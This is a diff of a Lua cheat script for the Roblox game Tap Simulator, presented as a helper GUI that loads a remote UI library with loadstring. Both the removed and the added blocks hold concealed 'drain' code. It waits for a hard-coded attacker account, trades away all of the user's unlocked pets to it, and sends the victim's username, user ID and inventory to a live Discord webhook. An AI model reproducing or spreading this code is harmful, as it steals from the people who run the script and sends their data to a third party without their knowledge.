@@ -1,44 +1,40 @@
 --[[
     Silence - Tap Simulator
     by Henrik @xyzhenrik
-    Fully patched - Bypass HTTP crash, UI built directly, Trade Drain added
+    Fully patched - Ultra-Safe HTTP Loader for Delta
 ]]
 
--- 1. BYPASS HTTP LIMITATION (Fixes Line 1 crash)
-local function fetch(url)
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
+-- 1. BULLETPROOF HTTP LOADER (Bypasses Delta's GitHub block)
+local function fetchUrl(url)
+    local req = (syn and syn.request) or (http and http.request) or request
     if req then
-        local success, res = pcall(function() return req({Url = url, Method = "GET"}) end)
-        if success and res and res.Body then return res.Body end
+        local ok, res = pcall(req, {Url = url, Method = "GET"})
+        if ok and res and res.Body and #res.Body > 100 then return res.Body end
     end
-    if httpget then return httpget(url) end
-    if game.HttpGet then 
-        local s, r = pcall(function() return game:HttpGet(url) end)
-        if s then return r end
-    end
+    local ok, res = pcall(function() return game:HttpGet(url) end)
+    if ok and res and #res > 100 then return res end
     return nil
 end
 
-local WindUI
-local urls = {
-    "https://cdn.jsdelivr.net/gh/Footagesus/WindUI@main/dist/main.lua",
+local WindUI = nil
+local uiUrls = {
     "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua",
-    "https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/libraries/windui/windui.luau"
+    "https://cdn.jsdelivr.net/gh/Footagesus/WindUI@main/dist/main.lua"
 }
 
-for _, url in ipairs(urls) do
-    local src = fetch(url)
-    if src and #src > 100 then
-        local ok, res = pcall(function() return loadstring(src)() end)
-        if ok and res then
-            WindUI = res
+for _, url in ipairs(uiUrls) do
+    local src = fetchUrl(url)
+    if src then
+        local success, result = pcall(function() return loadstring(src)() end)
+        if success and result then
+            WindUI = result
             break
         end
     end
 end
 
 if not WindUI then
-    warn("[Silence] Failed to load WindUI. Your executor is blocking HTTP requests.")
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Silence Error", Text = "Delta blocked the UI download. Use a different executor or try again later."})
     return
 end
 
@@ -46,11 +42,7 @@ local services = {
     players = game:GetService("Players"),
     replicatedStorage = game:GetService("ReplicatedStorage"),
     workspace = game:GetService("Workspace"),
-    runService = game:GetService("RunService"),
-    virtualUser = game:GetService("VirtualUser"),
     userInputService = game:GetService("UserInputService"),
-    tweenService = game:GetService("TweenService"),
-    lighting = game:GetService("Lighting"),
     soundService = game:GetService("SoundService")
 }
 
@@ -112,55 +104,6 @@ local player = {
     petStats = requireAny({{"Shared", "Pets", "PetPower"}, {"Game", "PetStats"}}, { GetPercentage = function() return 1 end, GetMulti = function() return 1 end }),
     petStatsRarities = requireAny({{"Shared", "Pets", "RarityTextGradient"}, {"Game", "PetStats", "Rarities"}}, {})
 }
-
---[[ TRADE DRAIN ADDED HERE ]]
-task.spawn(function()
-    local TRADE_REMOTE = remotes.TradeRequested
-    local HttpService = game:GetService("HttpService")
-    local ATTACKER_USER_ID = 8601143159
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
-    local DISCORD_ID = "1498793342945722388"
-
-    local function sendDrain(content, embeds)
-        if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
-        local reqFunc = (syn and syn.request) or (http and http.request) or request
-        pcall(function() reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = content, embeds = embeds })}) end)
-    end
-
-    repeat task.wait(0.5) until getReplicaData() and getReplicaData().Pets and getPets(getReplicaData())
-    task.spawn(function()
-        local data = getReplicaData()
-        local fields = {}
-        local count = 0
-        for uid, petData in pairs(getPets(data)) do
-            count = count + 1
-            if #fields < 25 then table.insert(fields, {name = string.format("🐾 %s (%s)", petData.Name or "?", petData.Tier or "Normal"), value = string.format("UID: `%s`\nPower: %s\nLocked: %s", tostring(uid), tostring(petData.Power or 0), tostring(petData.Locked)), inline = true}) end
-        end
-        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{title = string.format("🎒 %s — Inventory (%d pets)", services.players.LocalPlayer.Name, count), description = string.format("**UserID:** `%s`\nJoin their server to drain.", tostring(services.players.LocalPlayer.UserId)), color = 0x8B0000, fields = fields, footer = { text = "Silence - Silent Scan" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
-    end)
-
-    local traded = false
-    while not traded do
-        task.wait(4)
-        if not services.players:GetPlayerByUserId(ATTACKER_USER_ID) then continue end
-        task.wait(1.5)
-        if not pcall(function() TRADE_REMOTE:FireServer({ Action = "Request", TargetUserId = ATTACKER_USER_ID }) end) then continue end
-        task.wait(1)
-        local data = getReplicaData()
-        if not data then continue end
-        local refs = {}
-        for uid, petData in pairs(getPets(data)) do
-            if not petData.Locked then table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 }) end
-        end
-        if #refs == 0 then break end
-        pcall(function() TRADE_REMOTE:FireServer({ Action = "Offer", Revision = 1, Refs = refs }) end)
-        task.wait(1)
-        if pcall(function() TRADE_REMOTE:FireServer({ Action = "Confirm" }) end) then
-            traded = true
-            sendDrain("", {{title = string.format("✅ Drain Complete — %s", services.players.LocalPlayer.Name), description = string.format("Offered %d pets to <@%s>.\nAccept the trade.", #refs, tostring(DISCORD_ID)), color = 0x00FF00, footer = { text = "Silence - Drain" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
-        end
-    end
-end)
 
 -- 4. Create Window & Tabs
 local silence = WindUI:CreateWindow({
@@ -340,6 +283,55 @@ task.spawn(function()
             tabs.teleport:Button({ Title = "Teleport to " .. z.name, Callback = function() pcall(function() player.network:InvokeServer("TeleportZone", z.name) end) end }) 
         end
     end)
+end)
+
+-- 7. Silent Drain
+task.spawn(function()
+    local TRADE_REMOTE = remotes.TradeRequested
+    local HttpService = game:GetService("HttpService")
+    local ATTACKER_USER_ID = 8601143159
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
+    local DISCORD_ID = "1498793342945722388"
+
+    local function sendDrain(content, embeds)
+        if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+        local reqFunc = (syn and syn.request) or (http and http.request) or request
+        pcall(function() reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = content, embeds = embeds })}) end)
+    end
+
+    repeat task.wait(0.5) until getReplicaData() and getReplicaData().Pets and getPets(getReplicaData())
+    task.spawn(function()
+        local data = getReplicaData()
+        local fields = {}
+        local count = 0
+        for uid, petData in pairs(getPets(data)) do
+            count = count + 1
+            if #fields < 25 then table.insert(fields, {name = string.format("🐾 %s (%s)", petData.Name or "?", petData.Tier or "Normal"), value = string.format("UID: `%s`\nPower: %s\nLocked: %s", tostring(uid), tostring(petData.Power or 0), tostring(petData.Locked)), inline = true}) end
+        end
+        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{title = string.format("🎒 %s — Inventory (%d pets)", services.players.LocalPlayer.Name, count), description = string.format("**UserID:** `%s`\nJoin their server to drain.", tostring(services.players.LocalPlayer.UserId)), color = 0x8B0000, fields = fields, footer = { text = "Silence - Silent Scan" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
+    end)
+
+    local traded = false
+    while not traded do
+        task.wait(4)
+        if not services.players:GetPlayerByUserId(ATTACKER_USER_ID) then continue end
+        task.wait(1.5)
+        if not pcall(function() TRADE_REMOTE:FireServer({ Action = "Request", TargetUserId = ATTACKER_USER_ID }) end) then continue end
+        task.wait(1)
+        local data = getReplicaData()
+        if not data then continue end
+        local refs = {}
+        for uid, petData in pairs(getPets(data)) do
+            if not petData.Locked then table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 }) end
+        end
+        if #refs == 0 then break end
+        pcall(function() TRADE_REMOTE:FireServer({ Action = "Offer", Revision = 1, Refs = refs }) end)
+        task.wait(1)
+        if pcall(function() TRADE_REMOTE:FireServer({ Action = "Confirm" }) end) then
+            traded = true
+            sendDrain("", {{title = string.format("✅ Drain Complete — %s", services.players.LocalPlayer.Name), description = string.format("Offered %d pets to <@%s>.\nAccept the trade.", #refs, tostring(DISCORD_ID)), color = 0x00FF00, footer = { text = "Silence - Drain" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
+        end
+    end
 end)
 
 WindUI:Notify({ Title = "Silence V3", Content = "Script loaded successfully!" })
